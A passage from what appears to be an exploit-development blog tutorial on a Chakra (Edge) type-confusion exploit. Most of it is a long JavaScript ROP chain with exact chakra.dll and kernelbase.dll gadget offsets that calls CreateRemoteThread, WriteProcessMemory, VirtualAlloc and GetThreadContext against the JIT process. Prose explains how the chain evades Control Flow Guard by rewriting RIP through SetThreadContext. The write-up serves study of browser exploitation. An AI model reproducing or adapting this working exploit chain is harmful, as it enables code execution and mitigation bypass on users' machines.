write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();

// LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
next();

// SIZE_T dwStackSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
next();

// Call KERNELBASE!CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
next();

// WriteProcessMemory() ROP chain (Number 2)
// Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget for lpAddress

// Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetOne, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain (Number 3)
// Stage 6 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rdi gadget for our "fake return address"

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetTwo, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// VirtualAlloc() ROP chain
// Stage 7 -> Allocate some local memory to store the CONTEXT structure from GetThreadContext

// DWORD flProtect (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // PAGE_READWRITE (0x4)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// LPVOID lpAddress (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (let VirtualAlloc() decide the address)
next();

// SIZE_T dwSize (RDX) (0x4d0 = sizeof(CONTEXT))
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x000004d0, 0x00000000);             // (0x4d0 bytes)
next();

// DWORD flAllocationType (R8) ( MEM_RESERVE | MEM_COMMIT = 0x3000)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT (0x3000)
next();

// Call KERNELBASE!VirtualAlloc
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x5ac10, kernelbaseHigh); // KERNELBASE!VirtualAlloc address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAlloc)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAlloc - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();

// GetThreadContext() ROP chain
// Stage 8 -> Dump the registers of our newly created thread within the JIT process to leak the stack

// First, let's store some needed offsets of our VirtualAlloc allocation, as well as the address itself, in the .data section of kernelbase.dll
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108, kernelbaseHigh); // .data section of kernelbase.dll where we will store the VirtualAlloc allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// Save VirtualAlloc_allocation+0x30. This is the offset in our buffer (CONTEXT structure) that is ContextFlags
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x22b732, chakraHigh);       // 0x18022b732: add rax, 0x10 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll where we will store CONTEXT.ContextFlags
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// We need to set CONTEXT.ContextFlags. This address (0x30 offset from CONTEXT buffer allocated from VirtualAlloc) is in kernelbase+0x21a110
// The value we need to set is 0x10001F
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);        // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a110, kernelbaseHigh); // .data section of kernelbase.dll with CONTEXT.ContextFlags address
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x0010001F, 0x00000000);             // CONTEXT_ALL
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// HANDLE hThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future mov qword [rax+0x20], rcx gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where our thread HANDLE is
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (RAX already has valid pointer)
next();

// LPCONTEXT lpContext
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
next();                                                                      
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// Call KERNELBASE!GetThreadContext
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x72d10, kernelbaseHigh); // KERNELBASE!GetThreadContext address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!GetThreadContext)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);       // "return address" for KERNELBASE!GetThreadContext - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
```

Using the same method of setting a breakpoint on `jmp rax` we can examine the first gadget in our `GetThreadContext` ROP chain.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion159.png" alt="">

We start off our `GetThreadContext` ROP chain by preserving the address of our previous `VirtualAlloc` allocation (which is still in RAX) into the `.data` section of `kernelbase.dll`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion160.png" alt="">

The next thing we will do is _also_ preserve our `VirtualAlloc` allocation, specifically `VirtualAlloc_allocation + 0x30` into the `.data` section of `kernelbase.dll`, as well. We have already pointed out that `CONTEXT.ContextFlags` is located at `CONTEXT + 0x30` and, since our `VirtualAlloc_allocation` is acting as our `CONTEXT` structure, we can think of this as saving our `ContextFlags` address within the `.data` section of `kernelbase.dll` so we can write to it later with our needed `0x10001f` value. Since our original base `VirtualAlloc` allocation was already in RAX, we can simply just add `0x30` to it, and perform another write.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion161.png" alt="">

At this point we have successfully saved out `CONTEXT` address and our `CONTEXT.ContextFlags` address in memory for persistent storage, for the duration of the exploit.

The next thing we will do is update `CONTEXT.ContextFlags`. Since we have already preserved the address of `ContextFlags` in memory (`.data` section of `kernelbase.dll`), we can simply `pop` this address into a register, dereference it, and update it accordingly (the `pop rax` gadget below is, again, to bypass the `cmp` instruction that is a residual instruction in our ROP gadget which requires a valid, writable address).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion162.png" alt="">

If we actually parse our `VirtualAlloc` allocation as a `CONTEXT` structure, we can see we properly set `ContextFlags`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion163.png" alt="">

At this point our call is in the following state:

```c
VirtualAlloc_buffer.ContextFlags = CONTEXT_ALL		// CONTEXT_ALL = 0x10001f

GetThreadContext(
	-
	-
);
```

Let's now step through more of the ROP chain and start out by retrieving our thread's handle from the `.data` section of `kernelbase.dll`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion164.png" alt="">

At this point our call is in the following state:

```c
VirtualAlloc_buffer.ContextFlags = CONTEXT_ALL		// CONTEXT_ALL = 0x10001f

GetThreadContext(
	threadHandle,					// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
	-
);
```

For our last parameter, `lpContext`, we simply just need to pass in the pointer returned earlier from `VirtualAlloc` (which we stored in the `.data` section of `kernelbase.dll`). Again, we use the same `mov rdx, [rdx+0x8]` gadget we have seen in this blog post. So instead of directly popping the address which points to our `VirtualAlloc` allocation, we pass in the address - `0x8` so that when the dereference happens, the `+0x8` and the `-0x8` offset each other. This is done with the following ROP gadgets:

```javascript
// LPCONTEXT lpContext
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a108-0x8, kernelbaseHigh); // .data section of kernelbase.dll where our VirtualAlloc allocation is (our CONTEXT structure)
next();                                                                      
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();
```

Our call, after the above gadgets, is now ready to go as such:

```c
VirtualAlloc_buffer.ContextFlags = CONTEXT_ALL		// CONTEXT_ALL = 0x10001f

GetThreadContext(
	threadHandle,					// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
	addressof(VirtualAlloc_buffer)			// The buffer to receive the CONTEXT structure
);
```

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion165.png" alt="">

After executing the call with `pt` we can see we successfully leaked the stack of the remote thread!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion166.png" alt="">

However, if we take a look at the RIP member, which _should_ be a pointer to our `ret` gadget (theoretically), we can see it is not. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion167.png" alt="">

Instead, it is a call to `RtlUserThreadStart`. This makes total sense, as our thread was created in a _suspended_ state - and wasn't actually executed yet. So, the entry point of this thread is still on the start function. If we actually debug the JIT process and manually resume this thread (using Process Hacker, for instance), we can see execution actually fails (sorry for the WinDbg classic screenshots):

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion168.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion169.png" alt="">

Remember earlier when I talked about the nuances of setting the entry point directly with our call to `CreateRemoteThread`? This is Control Flow Guard kicking in and exposing this nuance. When we set the routine for `CreateRemoteThread` to execute, we actually did so with a `ret` ROP gadget. As we know, most functions _end_ with a `ret` statement - so this means we told our program we wanted to call into the _end_ of a function. Control Flow Guard, when performing a `call` will check to see if the `call` target is a valid function. The way this manifests is through a bitmap of all known "valid call targets". CFG will check to see if you are calling into know targets at `0x10` byte boundaries - as functions should be aligned in this manner. Since we called into a function towards the end, we obviously didn't call in a `0x10` byte alignment and, thus, CFG will kill the process as it has deemed to have detected an invalid function (and rightly so, we were maliciously trying to call into the middle of a function). The way we can get around this, is to use a call to `SetThreadContext` to manually update RIP to _directly_ execute our ROP gadget after resuming, instead of asking `CreateRemoteThread` to perform a `call` instruction to it (which CFG will check). This will require a few extra steps, but we are nearing the end now.

Manipulating RIP and Preserving RSP
---

The next thing we are going to do is to preserve the location of RIP and RSP from our captured thread context. We will first start by locating RSP, which is at an offset of `0x98` within a `CONTEXT` structure. We will persistently store this in the `.data` section of `kernelbase.dll`. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion170.png" alt="">

We can use the following ROP snippet (including previous chains) to store `CONTEXT.Rsp` and to update `CONTEXT.Rip` directly. Remember, when we _directly_ act on RIP instead of asking the thread to perform a `call` on our gadget (which CFG checks) we can "bypass the CFG check" and, thus, just directly return back to the stack.

```javascript
// alert() for debugging
alert("DEBUG");

